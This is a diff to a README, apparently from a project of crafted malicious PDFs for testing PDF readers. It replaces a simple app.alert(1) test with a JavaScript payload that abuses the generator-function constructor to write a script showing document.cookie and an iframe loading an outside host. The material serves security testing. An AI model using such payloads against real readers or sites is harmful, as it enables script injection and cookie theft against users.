@@ -18,7 +18,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 
 **Line 31**. Understand if [Acrobat Javascript APIs](https://www.adobe.com/content/dam/acom/en/devnet/acrobat/pdfs/AcrobatDC_js_api_reference.pdf) are supported.
 ```
-/JS (app.alert\(1\);)
+/JS (app.alert\(1\); Object.getPrototypeOf(function*(){}).constructor = null; ((function*(){}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src=https://14.rs>');"))().next();)
 ```
 
 **Line 69**. Try to run arbitrary Javascript abusing the data URI scheme.
